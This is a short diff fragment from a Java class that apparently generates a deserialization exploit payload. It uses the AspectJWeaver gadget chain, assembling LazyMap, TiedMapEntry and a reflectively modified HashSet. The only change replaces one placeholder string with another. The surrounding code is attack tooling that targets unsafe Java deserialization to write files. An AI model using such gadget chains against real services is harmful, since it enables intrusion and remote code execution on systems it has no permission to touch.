@@ -47,7 +47,7 @@ public class aspectjweaver2 implements ObjectPayload<Serializable>{
         Map          lazyMap = LazyMap.decorate((Map) simpleCache, ct);
         TiedMapEntry entry   = new TiedMapEntry(lazyMap, filename);
         HashSet      map     = new HashSet(1);
-        map.add("nu1r");
+        map.add("QI4L");
         Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
